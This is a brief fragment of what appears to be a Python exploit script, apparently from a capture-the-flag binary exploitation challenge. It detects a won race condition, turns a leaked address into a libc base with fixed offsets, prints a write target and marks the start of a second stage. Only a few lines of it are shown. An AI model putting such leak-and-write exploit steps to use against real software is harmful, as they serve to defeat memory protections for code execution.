...
if (b'Next' in leak):
    ...
    print("[+] Race success")
    libc_leak = leak[0:12]
    libc_base = int(libc_leak,0x10) + 0x24ff0
    # libc_base = int(libc_leak,0x10)-(0x739c33b1b010-0x739c33800000)
    # libc_base = (libc_base & 0xFFFFFFFFFFF00000) + 0x100000
...
print(f"target_write: {hex(target_write)}!")
###################################################################
########################### [ STAGE 2 ] ###########################
###################################################################
